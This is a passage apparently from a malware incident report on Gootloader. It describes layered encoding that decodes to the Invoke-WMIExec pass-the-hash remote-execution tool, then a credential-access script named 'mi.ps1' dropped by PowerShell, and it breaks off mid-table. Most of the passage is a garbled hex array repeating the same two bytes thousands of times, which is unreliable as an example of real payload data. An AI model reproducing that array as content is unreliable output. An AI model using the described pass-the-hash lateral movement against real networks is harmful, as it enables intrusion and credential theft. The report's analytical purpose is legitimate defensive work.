e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x\n```\n\nThe second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.\n\n```image\nAlt: Base64 Encoded\nDescription: The image displays a lengthy encoded PowerShell script, likely used for malicious purposes in a cyber attack, illustrating the complexity of the encoding methods employed by the threat actor. The script is presented in a monospaced font, indicating it is code rather than regular text. The encoding seems to involve multiple layers, including Base64 and potentially other obfuscation techniques, and appears to be related to the execution of a WMIExec script for remote queries.\n```\n\nDecoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.\n\n```image\nAlt: WMIExec\nDescription: The image depicts a user interface for a decoding tool, showing an input section containing a Base64 encoded string that has been obfuscated. The output section displays the decoded PowerShell script named 'Invoke-WMIExec', which includes comments and parameters for executing WMI commands on target hosts using NTLMv2 for authentication. The layout suggests this is a practical demonstration of decoding a potentially malicious script related to cyber threats.\nTranscription: |\n  function Invoke-WMIExec\n  {\n  <#\n  .SYNOPSIS\n  Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.\n  \n  Author: Kevin Robertson (@kevin_robertson)\n  License: BSD 3-Clause\n  \n  .PARAMETER Target\n  Hostname or IP address of target.\n  \n  .PARAMETER Username\n  Username to use for authentication.\n  \n  .PARAMETER Domain\n  Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username.\n  \n  .PARAMETER Hash\n  NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.\n  \n  .PARAMETER Command\n  Command to execute on the target. If a command is not specified, the function will just check to see if the username and hash has access to WMI on the target.\n  #>\n```\n\n## Credential Access\n\nThe malicious PowerShell process used by Gootloader dropped a PowerShell script named “mi.ps1” on the file system.\n\n```image\nAlt: mi.ps1\nDescription: The image displays a table documenting a file creation event related to a cybersecurity incident. It includes columns for 'Action Type', 'Folder Path', 'File Name', and 'Initiating Process Folder Path'. The 'Action Type' indicates 'FileCreated', the 'Folder Path' shows 'C:\\Users\\<redacted>', the 'File Name' is 'mi.ps1', and the 'Initiating Process Folder Path' is 'C:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe'. This data is relevant to tracking the activities of a malicious PowerShell script in the context of credential access.\nTranscription: |\n  Action Type      Folder Path      File Name   